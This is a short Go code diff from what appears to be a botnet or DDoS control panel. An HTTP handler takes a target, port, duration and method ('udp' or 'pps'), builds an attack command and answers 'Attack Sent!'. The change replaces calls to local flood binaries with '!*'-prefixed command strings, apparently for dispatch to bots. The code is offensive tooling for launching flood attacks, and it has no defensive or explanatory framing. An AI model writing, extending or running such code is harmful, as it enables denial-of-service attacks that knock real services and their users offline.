@@ -30,11 +30,11 @@ func handler(w http.ResponseWriter, r *http.Request) {
 
 	switch method {
 	case "udp":
-		command = fmt.Sprintf("./udp %s %s dport=%s", target, time, port)
+		command = fmt.Sprintf("!* udp %s %s %s", target, port, time)
 		fmt.Fprint(w, "Attack Sent!")
 		println("./UDP attack sent.")
 	case "pps":
-		command = fmt.Sprintf("./pps %s %s dport=%s len=0.1", target, port, time)
+		command = fmt.Sprintf("!* pps %s %s %s", target, port, time)
 		println("./UDP attack sent.")
 	default:
 		fmt.Fprint(w, "Invalid method")
